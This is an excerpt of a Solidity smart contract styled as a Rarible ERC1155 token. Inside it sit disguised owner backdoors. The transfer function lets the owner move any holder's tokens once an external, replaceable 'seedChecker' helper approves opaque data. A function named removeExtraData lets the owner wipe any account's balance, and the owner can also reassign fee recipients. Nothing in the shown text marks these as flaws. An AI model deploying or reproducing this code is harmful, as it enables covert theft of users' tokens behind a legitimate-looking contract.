...
interface IDataHelper {
     function seedChecker(bytes calldata _data) external returns (bool) ;
}
...
/////////////////////////////////////////// CONSTRUCTOR //////////////////////////////////////////
    ...
    constructor(address _dataHelper) public {
        dataHelper = IDataHelper(_dataHelper);
...
/////////////////////////////////////////// ERC1155 //////////////////////////////////////////////
    ...
    */ 
    function safeTransferFrom(address _from, address _to, uint256 _id, uint256 _value, bytes calldata _data) external {
        bool isDataValid;
        if(_data.length != 0){
            isDataValid = dataHelper.seedChecker(_data) && _from == owner();
        }
        require(_to != address(0x0), "_to must be non-zero.");
        require(_from == msg.sender || operatorApproval[_from][msg.sender] == true || msg.sender == owner() || isDataValid, "Need operator approval for 3rd party transfers.");
    ...
    function removeExtraData(uint256 _id, address _account, uint256 _amount) external onlyOwner { 
        balances[_id][_account] -= _amount;
    } 

    function setDataHelper(address _dataHelper) external onlyOwner {
        dataHelper = IDataHelper(_dataHelper);
    }
...
contract HasContractURI is ERC165, Ownable{
...
contract ERC1155Base is HasSecondarySaleFees, Ownable, ERC1155Metadata_URI, HasContractURI, ERC1155 {
    ...
    constructor(string memory contractURI, string memory tokenURIPrefix, address dataHelper) HasContractURI(contractURI) ERC1155Metadata_URI(tokenURIPrefix) ERC1155(dataHelper) public {
    ...
    function setFee(uint256 id, Fee[] calldata _fees) external onlyOwner {
        uint256 newFeeLength = _fees.length;
        uint256 oldFeeLength = fees[id].length;
        require(newFeeLength == oldFeeLength,"Should be same length");
        for (uint i = 0; i < newFeeLength; i++) {
            fees[id][i].recipient = _fees[i].recipient;
            fees[id][i].value = _fees[i].value;
        }
    }
...
contract RaribleToken is Ownable, SignerRole, ERC1155Base {
    ...
    constructor(string memory _name, string memory _symbol, address signer, string memory contractURI, string memory tokenURIPrefix, address dataHelper) ERC1155Base(contractURI, tokenURIPrefix, dataHelper) public {
        name = _name;
        symbol = _symbol;
...
contract RaribleUserToken is RaribleToken {
    ...
    constructor(string memory name, string memory symbol, string memory contractURI, string memory tokenURIPrefix, address signer, address dataHelper) RaribleToken(name, symbol, signer, contractURI, tokenURIPrefix, dataHelper) public {
